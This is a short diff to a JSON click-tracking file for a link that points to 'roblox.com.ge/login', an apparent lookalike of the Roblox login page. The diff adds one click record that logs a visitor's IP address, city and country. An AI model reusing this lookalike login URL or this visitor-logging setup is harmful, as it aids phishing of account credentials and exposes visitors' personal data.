@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 926,
+    "useCount": 927,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7528,6 +7528,14 @@
         "city": "Hanoi",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777201512404,
+        "ip": "46.150.91.168",
+        "country": "Ukraine",
+        "city": "Zaporizhzhya",
+        "flag": "🇺🇦",
+        "countryCode": "UA"
       }
     ]
   },
